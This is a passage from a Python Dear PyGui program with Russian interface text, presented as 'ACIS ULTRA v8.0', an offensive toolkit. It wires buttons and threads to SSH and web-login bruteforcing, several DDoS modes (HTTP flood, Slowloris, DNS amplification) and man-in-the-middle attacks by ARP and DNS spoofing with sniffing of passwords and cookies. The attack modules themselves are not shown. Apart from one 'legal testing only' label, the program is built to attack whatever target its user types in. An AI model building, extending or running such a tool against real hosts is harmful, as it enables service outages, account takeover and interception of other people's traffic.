            
            log_msg(f"SSH брутфорс завершен", "success")
            
        except Exception as e:
            log_msg(f"Ошибка брутфорса: {str(e)}", "error")
        
        BRUTEFORCE_RUNNING = False
    
    threading.Thread(target=bruteforce_thread, daemon=True).start()

def run_web_form_bruteforce_gui(url):
    """Брутфорс веб-формы через GUI"""
    with dpg.window(label="Web Form Bruteforce", width=500, height=400, modal=True):
        dpg.add_text("БРУТФОРС ВЕБ-ФОРМЫ", color=COLORS["accent_red"])
        dpg.add_separator()
        
        dpg.add_text("URL формы:", color=COLORS["text_secondary"])
        url_input = dpg.add_input_text(default_value=url + "/login.php", width=400)
        
        dpg.add_spacer(height=10)
        
        dpg.add_text("Поле логина:", color=COLORS["text_secondary"])
        user_field = dpg.add_input_text(default_value="username", width=200)
        
        dpg.add_text("Поле пароля:", color=COLORS["text_secondary"])
        pass_field = dpg.add_input_text(default_value="password", width=200)
        
        dpg.add_spacer(height=10)
        
        dpg.add_text("Индикатор успеха (опционально):", color=COLORS["text_secondary"])
        success_indicator = dpg.add_input_text(default_value="Dashboard", width=300)
        
        dpg.add_spacer(height=20)
        
        def start_bruteforce():
            form_url = dpg.get_value(url_input)
            username_field = dpg.get_value(user_field)
            password_field = dpg.get_value(pass_field)
            indicator = dpg.get_value(success_indicator)
            
            if not form_url:
                log_msg("Введите URL формы", "error")
                return
            
            log_msg(f"Запуск брутфорса формы: {form_url}", "attack")
            
            def bruteforce_thread():
                try:
                    results = bruteforcer.web_form_bruteforce(
                        form_url, username_field, password_field, 
                        indicator if indicator else None
                    )
                    
                    with dpg.window(label="Bruteforce Results", width=600, height=400, modal=True):
                        dpg.add_text(f"РЕЗУЛЬТАТЫ БРУТФОРСА", color=COLORS["accent_red"])
                        dpg.add_separator()
                        
                        for result in results:
                            if '[+]' in result:
                                dpg.add_text(result, color=COLORS["success"])
                            else:
                                dpg.add_text(result, color=COLORS["text_primary"])
                    
                    log_msg(f"Брутфорс формы завершен", "success")
                    
                except Exception as e:
                    log_msg(f"Ошибка брутфорса: {str(e)}", "error")
            
            threading.Thread(target=bruteforce_thread, daemon=True).start()
        
        dpg.add_button(
            label="НАЧАТЬ БРУТФОРС",
            width=200,
            height=40,
            callback=start_bruteforce
        )

def launch_advanced_ddos():
    """Запуск продвинутой DDoS атаки"""
    global ATTACK_RUNNING, ATTACK_THREAD
    
    if ATTACK_RUNNING:
        stop_ddos_attack()
        return
    
    attack_type = dpg.get_value("ddos_type")
    target = dpg.get_value("url_input")
    
    if not target or len(target) < 5:
        log_msg("Введите цель для атаки", "error")
        return
    
    try:
        duration = dpg.get_value("ddos_duration")
        threads = dpg.get_value("ddos_threads")
        
        log_msg(f"Запуск {attack_type} атаки на {target}", "attack")
        log_msg(f"Длительность: {duration} сек, Потоков: {threads}", "attack")
        
        ATTACK_RUNNING = True
        dpg.configure_item("ddos_launch_btn", label="ОСТАНОВИТЬ АТАКУ")
        
        def attack_thread():
            success = False
            
            try:
                if attack_type == "HTTP Flood":
                    method = dpg.get_value("ddos_method")
                    success = ddos.advanced_http_flood(target, duration, threads, method)
                
                elif attack_type == "Slowloris":
                    sockets = threads * 2
                    success = ddos.slowloris_advanced(target, sockets, duration)
                
                elif attack_type == "UDP Amplification":
                    success = ddos.udp_amplification(target, min(duration, 60))
                
                elif attack_type == "Mixed Attack":
                    success = ddos.mixed_attack(target, duration)
                
                if success:
                    log_msg(f"Атака {attack_type} завершена успешно", "success")
                else:
                    log_msg("Атака прервана", "warning")
                    
            except Exception as e:
                log_msg(f"Ошибка атаки: {str(e)}", "error")
            finally:
                global ATTACK_RUNNING
                ATTACK_RUNNING = False
                dpg.configure_item("ddos_launch_btn", label="ЗАПУСТИТЬ АТАКУ")
        
        ATTACK_THREAD = threading.Thread(target=attack_thread, daemon=True)
        ATTACK_THREAD.start()
        
    except Exception as e:
        log_msg(f"Ошибка запуска: {str(e)}", "error")
        ATTACK_RUNNING = False

def stop_ddos_attack():
    """Остановка DDoS атаки"""
    global ATTACK_RUNNING
    if ATTACK_RUNNING:
        ddos.stop()
        ATTACK_RUNNING = False
        dpg.configure_item("ddos_launch_btn", label="ЗАПУСТИТЬ АТАКУ")
        log_msg("Атака остановлена пользователем", "warning")

def show_ddos_stats():
    """Показ статистики DDoS атаки"""
    with dpg.window(label="Статистика атаки", width=500, height=400, modal=True):
        dpg.add_text("СТАТИСТИКА DDOS АТАКИ", color=COLORS["accent_red"])
        dpg.add_separator()
        
        if ddos.request_count > 0:
            dpg.add_text(f"Отправлено запросов: {ddos.request_count:,}", color=COLORS["text_primary"])
            
            if ATTACK_RUNNING:
                dpg.add_text("СТАТУС: АКТИВНА", color=COLORS["error"])
                dpg.add_text("Нажмите ОСТАНОВИТЬ АТАКУ для прекращения", color=COLORS["warning"])
            else:
                dpg.add_text("СТАТУС: ЗАВЕРШЕНА", color=COLORS["success"])
            
            dpg.add_spacer(height=10)
            dpg.add_text("Методы атаки:", color=COLORS["accent_yellow"])
            dpg.add_text("• HTTP Flood: Множественные HTTP запросы", color=COLORS["text_secondary"])
            dpg.add_text("• Slowloris: Долгие соединения", color=COLORS["text_secondary"])
            dpg.add_text("• UDP Amplification: Усиление через DNS", color=COLORS["text_secondary"])
            dpg.add_text("• Mixed: Комбинация всех методов", color=COLORS["text_secondary"])
        else:
            dpg.add_text("Нет статистики атаки", color=COLORS["text_secondary"])

def run_mitm_attack():
    """Запуск MITM атаки"""
    global MITM_RUNNING
    
    if MITM_RUNNING:
        stop_mitm_attack()
        return
    
    mitm_type = dpg.get_value("mitm_type")
    target_ip = dpg.get_value("mitm_target")
    gateway_ip = dpg.get_value("mitm_gateway")
    
    if not target_ip:
        log_msg("Введите IP цели", "error")
        return
    
    log_msg(f"Запуск MITM атаки: {mitm_type} на {target_ip}", "attack")
    
    def mitm_thread():
        global MITM_RUNNING
        MITM_RUNNING = True
        
        try:
            if mitm_type == "ARP Spoof":
                if not gateway_ip:
                    log_msg("Введите IP шлюза для ARP Spoof", "error")
                    MITM_RUNNING = False
                    return
                
                interface = dpg.get_value("mitm_interface") or "eth0"
                success = mitm.arp_spoof(target_ip, gateway_ip, interface)
                
                if success:
                    log_msg("ARP Spoofing запущен", "success")
                    
                    # Запускаем сниффер в отдельном потоке
                    sniff_thread = threading.Thread(
                        target=lambda: mitm.packet_sniffer(count=1000),
                        daemon=True
                    )
                    sniff_thread.start()
                else:
                    log_msg("Ошибка ARP Spoofing", "error")
            
            elif mitm_type == "DNS Spoof":
                target_domain = dpg.get_value("mitm_domain")
                spoof_ip = dpg.get_value("mitm_spoof_ip")
                
                if not target_domain or not spoof_ip:
                    log_msg("Введите домен и IP для спуфинга", "error")
                    MITM_RUNNING = False
                    return
                
                success = mitm.dns_spoof(target_domain, spoof_ip)
                if success:
                    log_msg(f"DNS Spoofing запущен: {target_domain} -> {spoof_ip}", "success")
                else:
                    log_msg("Ошибка DNS Spoofing", "error")
            
        except Exception as e:
            log_msg(f"Ошибка MITM: {str(e)}", "error")
        
        MITM_RUNNING = False
    
    threading.Thread(target=mitm_thread, daemon=True).start()

def stop_mitm_attack():
    """Остановка MITM атаки"""
    global MITM_RUNNING
    if MITM_RUNNING:
        mitm.stop()
        MITM_RUNNING = False
        log_msg("MITM атака остановлена", "warning")

def show_mitm_results():
    """Показ результатов MITM атаки"""
    with dpg.window(label="MITM Результаты", width=700, height=500, modal=True):
        dpg.add_text("ПЕРЕХВАЧЕННЫЕ ДАННЫЕ", color=COLORS["accent_purple"])
        dpg.add_separator()
        
        if mitm.captured_data:
            for data in mitm.captured_data[-50:]:  # Последние 50 записей
                dpg.add_text(data, color=COLORS["text_primary"])
        else:
            dpg.add_text("Данные не перехвачены", color=COLORS["text_secondary"])

# ==================== СОЗДАНИЕ ИНТЕРФЕЙСА ====================

def create_interface():
    with dpg.window(tag="main_window", label="ACIS ULTRA v8.0 | Advanced Penetration System"):
        
        # Шапка
        with dpg.group():
            dpg.add_text("=" * 75, color=COLORS["accent_cyan"])
            dpg.add_text("ACIS ULTRA v8.0 | ADVANCED PENETRATION TESTING SYSTEM", color=COLORS["accent_green"])
            dpg.add_text("=" * 75, color=COLORS["accent_cyan"])
        
        # Панель ввода URL
        with dpg.group(horizontal=True):
            dpg.add_text("ЦЕЛЕВОЙ URL:", color=COLORS["accent_yellow"])
            url_input = dpg.add_input_text(
                hint="https://example.com",
                width=550,
                tag="url_input",
                default_value=""
            )
            
            dpg.add_button(
                label="ГЛУБОКИЙ АНАЛИЗ",
                width=150,
                height=32,
                callback=deep_analyze_site,
                tag="analyze_btn"
            )
        
        # Прогресс бар
        dpg.add_progress_bar(
            tag="progress",
            default_value=0.0,
            overlay="Готово",
            height=18,
            width=-1
        )
        
        dpg.add_spacer(height=10)
        
        # Вкладки
        with dpg.tab_bar(tag="tab_bar"):
            
            # Вкладка анализа
            with dpg.tab(label="АНАЛИЗ"):
                with dpg.child_window(tag="results_area", height=-1, border=True):
                    dpg.add_text("Введите URL и нажмите ГЛУБОКИЙ АНАЛИЗ", color=COLORS["text_secondary"])
            
            # Вкладка эксплойтов
            with dpg.tab(label="ЭКСПЛОЙТЫ"):
                with dpg.child_window(height=-1, border=True):
                    with dpg.group(tag="exploit_main_area"):
                        dpg.add_text("Сначала выполните анализ сайта", color=COLORS["text_secondary"])
                        dpg.add_text("Доступные эксплойты появятся здесь", color=COLORS["text_secondary"])
            
            # Вкладка DDoS
            with dpg.tab(label="DDOS АТАКА"):
                with dpg.group():
                    dpg.add_text("ПРОДВИНУТАЯ DDOS АТАКА", color=COLORS["accent_red"])
                    dpg.add_spacer(height=10)
                    
                    # Выбор типа атаки
                    with dpg.group(horizontal=True):
                        with dpg.group(width=350):
                            dpg.add_text("ТИП АТАКИ:", color=COLORS["accent_yellow"])
                            dpg.add_combo(
                                items=["HTTP Flood", "Slowloris", "UDP Amplification", "Mixed Attack"],
                                default_value="HTTP Flood",
                                width=-1,
                                tag="ddos_type"
                            )
                        
                        dpg.add_spacer(width=20)
                        
                        with dpg.group(width=350):
                            dpg.add_text("HTTP МЕТОД:", color=COLORS["accent_yellow"])
                            dpg.add_combo(
                                items=["GET", "POST", "MIXED"],
                                default_value="GET",
                                width=-1,
                                tag="ddos_method"
                            )
                    
                    dpg.add_spacer(height=15)
                    
                    # Настройки
                    with dpg.group(horizontal=True):
                        with dpg.group(width=350):
                            dpg.add_text("КОЛИЧЕСТВО ПОТОКОВ:", color=COLORS["accent_yellow"])
                            dpg.add_slider_int(
                                default_value=200,
                                min_value=10,
                                max_value=1000,
                                width=-1,
                                tag="ddos_threads"
                            )
                        
                        dpg.add_spacer(width=20)
                        
                        with dpg.group(width=350):
                            dpg.add_text("ДЛИТЕЛЬНОСТЬ (сек):", color=COLORS["accent_yellow"])
                            dpg.add_slider_int(
                                default_value=120,
                                min_value=10,
                                max_value=600,
                                width=-1,
                                tag="ddos_duration"
                            )
                    
                    dpg.add_spacer(height=25)
                    
                    # Кнопки управления
                    with dpg.group(horizontal=True):
                        dpg.add_button(
                            label="ЗАПУСТИТЬ АТАКУ",
                            width=220,
                            height=55,
                            callback=launch_advanced_ddos,
                            tag="ddos_launch_btn"
                        )
                        
                        dpg.add_spacer(width=20)
                        
                        dpg.add_button(
                            label="СТАТИСТИКА",
                            width=180,
                            height=55,
                            callback=show_ddos_stats
                        )
                    
                    dpg.add_spacer(height=20)
                    dpg.add_separator()
                    dpg.add_spacer(height=10)
                    
                    # Описание методов
                    dpg.add_text("📋 МЕТОДЫ АТАКИ:", color=COLORS["accent_yellow"])
                    dpg.add_text("• HTTP Flood: Массовые HTTP запросы с ротацией заголовков", color=COLORS["text_secondary"])
                    dpg.add_text("• Slowloris: Держит множество соединений открытыми", color=COLORS["text_secondary"])
                    dpg.add_text("• UDP Amplification: Использует DNS для усиления", color=COLORS["text_secondary"])
                    dpg.add_text("• Mixed Attack: Комбинация всех методов", color=COLORS["text_secondary"])
                    
                    dpg.add_spacer(height=10)
                    dpg.add_text("⚠️ ВНИМАНИЕ: Только для легального тестирования!", color=COLORS["critical"])
            
            # Вкладка MITM
            with dpg.tab(label="MITM АТАКА"):
                with dpg.group():
                    dpg.add_text("MAN-IN-THE-MIDDLE АТАКА", color=COLORS["accent_purple"])
                    dpg.add_spacer(height=10)
                    
                    # Выбор типа MITM
                    dpg.add_text("ТИП MITM:", color=COLORS["accent_yellow"])
                    mitm_type = dpg.add_combo(
                        items=["ARP Spoof", "DNS Spoof"],
                        default_value="ARP Spoof",
                        width=300,
                        tag="mitm_type"
                    )
                    
                    dpg.add_spacer(height=15)
                    
                    # Настройки ARP Spoof
                    with dpg.group():
                        dpg.add_text("IP цели:", color=COLORS["text_secondary"])
                        dpg.add_input_text(
                            hint="192.168.1.100",
                            width=300,
                            tag="mitm_target"
                        )
                        
                        dpg.add_text("IP шлюза:", color=COLORS["text_secondary"])
                        dpg.add_input_text(
                            hint="192.168.1.1",
                            width=300,
                            tag="mitm_gateway"
                        )
                        
                        dpg.add_text("Сетевой интерфейс:", color=COLORS["text_secondary"])
                        dpg.add_input_text(
                            hint="eth0",
                            default_value="eth0",
                            width=300,
                            tag="mitm_interface"
                        )
                    
                    dpg.add_spacer(height=15)
                    
                    # Настройки DNS Spoof
                    with dpg.group():
                        dpg.add_text("Домен для спуфинга:", color=COLORS["text_secondary"])
                        dpg.add_input_text(
                            hint="example.com",
                            width=300,
                            tag="mitm_domain"
                        )
                        
                        dpg.add_text("IP для подмены:", color=COLORS["text_secondary"])
                        dpg.add_input_text(
                            hint="192.168.1.50",
                            width=300,
                            tag="mitm_spoof_ip"
                        )
                    
                    dpg.add_spacer(height=20)
                    
                    # Кнопки управления
                    with dpg.group(horizontal=True):
                        dpg.add_button(
                            label="ЗАПУСТИТЬ MITM",
                            width=180,
                            height=45,
                            callback=run_mitm_attack
                        )
                        
                        dpg.add_spacer(width=20)
                        
                        dpg.add_button(
                            label="ОСТАНОВИТЬ MITM",
                            width=180,
                            height=45,
                            callback=stop_mitm_attack
                        )
                        
                        dpg.add_spacer(width=20)
                        
                        dpg.add_button(
                            label="ПОКАЗАТЬ ДАННЫЕ",
                            width=180,
                            height=45,
                            callback=show_mitm_results
                        )
                    
                    dpg.add_spacer(height=20)
                    dpg.add_separator()
                    
                    dpg.add_text("📋 ВОЗМОЖНОСТИ MITM:", color=COLORS["accent_yellow"])
                    dpg.add_text("• ARP Spoof: Перехват трафика в локальной сети", color=COLORS["text_secondary"])
                    dpg.add_text("• DNS Spoof: Подмена DNS записей", color=COLORS["text_secondary"])
                    dpg.add_text("• Сниффинг: Перехват паролей и cookies", color=COLORS["text_secondary"])
                    dpg.add_text("⚠️ Требуются права администратора!", color=COLORS["critical"])
            
            # Вкладка инструментов
            with dpg.tab(label="ИНСТРУМЕНТЫ"):
                with dpg.group():
                    dpg.add_text("ПРОДВИНУТЫЕ ИНСТРУМЕНТЫ", color=COLORS["accent_green"])
                    dpg.add_spacer(height=10)
                    
                    # Брутфорс
                    dpg.add_text("🔐 БРУТФОРС АТАКИ:", color=COLORS["accent_red"])
                    dpg.add_spacer(height=10)
                    
                    with dpg.group(horizontal=True):
                        dpg.add_button(
                            label="SSH Bruteforce",
                            width=160,
                            height=40,
                            callback=lambda: run_ssh_bruteforce_gui(
                                dpg.get_value("url_input") or "192.168.1.1",
                                22
                            )
                        )
                        
                        dpg.add_spacer(width=10)
                        
                        dpg.add_button(
                            label="FTP Bruteforce",
                            width=160,
                            height=40
                        )
                        
                        dpg.add_spacer(width=10)
                        
                        dpg.add_button(
                            label="MySQL Bruteforce",
                            width=160,
                            height=40
                        )
                    
                    dpg.add_spacer(height=20)
                    dpg.add_separator()
                    dpg.add_spacer(height=10)
                    
                    # Сетевые инструменты
                    dpg.add_text("🌐 СЕТЕВЫЕ ИНСТРУМЕНТЫ:", color=COLORS["accent_cyan"])
                    dpg.add_spacer(height=10)
                    
                    with dpg.group(horizontal=True):
                        dpg.add_button(
                            label="Сканирование сети",
                            width=160,
                            height=40
                        )
                        
                        dpg.add_spacer(width=10)
                        
                        dpg.add_button(
                            label="Пакетный сниффер",
                            width=160,
                            height=40
                        )
                    
                    dpg.add_spacer(height=20)
                    dpg.add_separator()
                    dpg.add_spacer(height=10)
                    
                    # Веб инструменты
                    dpg.add_text("🕸 ВЕБ ИНСТРУМЕНТЫ:", color=COLORS["accent_orange"])
                    dpg.add_spacer(height=10)
                    
                    with dpg.group(horizontal=True):
                        dpg.add_button(
                            label="SQL Injection Scanner",
                            width=160,
                            height=40
                        )
                        
                        dpg.add_spacer(width=10)
                        
                        dpg.add_button(
                            label="XSS Scanner",
                            width=160,
                            height=40
                        )
                        
                        dpg.add_spacer(width=10)
                        
                        dpg.add_button(
                            label="Web Crawler",
                            width=160,
                            height=40
                        )
            
            # Вкладка истории
            with dpg.tab(label="ИСТОРИЯ"):
                with dpg.child_window(height=-1, border=True):
                    dpg.add_text("ИСТОРИЯ АНАЛИЗОВ", color=COLORS["accent_cyan"])
                    dpg.add_spacer(height=10)
                    
                    with dpg.group(tag="history_content"):
                        dpg.add_text("История появится после анализов", color=COLORS["text_secondary"])
            
            # Вкладка логов
            with dpg.tab(label="ЛОГИ"):
                with dpg.child_window(tag="log_scroll", height=-1, border=True):
                    with dpg.group(tag="log_content"):
                        dpg.add_text("СИСТЕМНЫЕ ЛОГИ", color=COLORS["accent_cyan"])
                        dpg.add_spacer(height=10)
                        log_msg("ACIS ULTRA v8.0 запущен", "success")
                        log_msg("Продвинутая система пентеста готова", "info")
                        log_msg("Все модули инициализированы", "success")
        
        # Статус бар
        dpg.add_spacer(height=10)
        dpg.add_separator()
        
        with dpg.group(horizontal=True):
            # Определение статуса
            if ATTACK_RUNNING:
                status_text = "DDOS АТАКА АКТИВНА"
                status_color = COLORS["error"]
            elif EXPLOIT_RUNNING:
                status_text = "ЭКСПЛОЙТ ВЫПОЛНЯЕТСЯ"
                status_color = COLORS["accent_purple"]
            elif MITM_RUNNING:
                status_text = "MITM АТАКА АКТИВНА"
                status_color = COLORS["accent_purple"]
            elif BRUTEFORCE_RUNNING:
                status_text = "БРУТФОРС ВЫПОЛНЯЕТСЯ"
                status_color = COLORS["accent_red"]
            else:
                status_text = "СИСТЕМА ГОТОВА"
                status_color = COLORS["success"]
            
            dpg.add_text("СТАТУС: ", color=COLORS["text_secondary"])
            dpg.add_text(status_text, color=status_color, tag="status_text")
            
            dpg.add_spacer()
            dpg.add_text(f"Версия: 8.0 | ", color=COLORS["text_secondary"])
            dpg.add_text(datetime.now().strftime("%H:%M:%S"), color=COLORS["text_secondary"], tag="time_display")

def update_gui():
    """Обновление GUI"""
    try:
        # Обновление времени
        current_time = datetime.now().strftime("%H:%M:%S")
        dpg.set_value("time_display", current_time)
        
        # Обновление статуса
        global ATTACK_RUNNING, EXPLOIT_RUNNING, MITM_RUNNING, BRUTEFORCE_RUNNING
        if ATTACK_RUNNING:
            status_text = "DDOS АТАКА АКТИВНА"
            status_color = COLORS["error"]
        elif EXPLOIT_RUNNING:
            status_text = "ЭКСПЛОЙТ ВЫПОЛНЯЕТСЯ"
            status_color = COLORS["accent_purple"]
        elif MITM_RUNNING:
            status_text = "MITM АТАКА АКТИВНА"
            status_color = COLORS["accent_purple"]
        elif BRUTEFORCE_RUNNING:
            status_text = "БРУТФОРС ВЫПОЛНЯЕТСЯ"
            status_color = COLORS["accent_red"]
        else:
            status_text = "СИСТЕМА ГОТОВА"
            status_color = COLORS["success"]
        
        dpg.set_value("status_text", status_text)
        
        # Анимация прогресс бара
        if dpg.does_item_exist("progress"):
            current = dpg.get_value("progress")
            if 0 < current < 1:
                dpg.set_value("progress", min(current + 0.01, 0.99))
            elif current >= 1:
                dpg.set_value("progress", 0.0)
        
    except Exception as e:
        print(f"Ошибка обновления GUI: {e}")

# ==================== ОСНОВНАЯ ФУНКЦИЯ ====================

def main():
    print("\n" + "="*75)
    print("ACIS ULTRA v8.0 - ADVANCED PENETRATION TESTING SYSTEM")
    print("="*75)
    print("[*] Запуск продвинутой системы...")
    print("[*] Инициализация всех модулей...")
    print("[*] Загрузка эксплойтов и словарей...")
    print("[*] Система готова! Открываю интерфейс...\n")
    
    # Создание интерфейса
    create_interface()
    
    # Настройки окна
    dpg.set_primary_window("main_window", True)
    dpg.show_viewport()
    
    # Главный цикл
    while dpg.is_dearpygui_running():
        update_gui()
        dpg.render_dearpygui_frame()
    
    # Очистка
    print("\n[*] Завершение работы...")
    if ATTACK_RUNNING:
        ddos.stop()
    if MITM_RUNNING:
        mitm.stop()
    dpg.destroy_context()
    print("[+] Система завершила работу")

# ==================== ЗАПУСК ====================

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Аварийное завершение...")
        if ATTACK_RUNNING:
            ddos.stop()
        if MITM_RUNNING:
            mitm.stop()
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] КРИТИЧЕСКАЯ ОШИБКА: {e}")
        import traceback
        traceback.print_exc()
        input("\nНажмите Enter для выхода...")
        sys.exit(1)
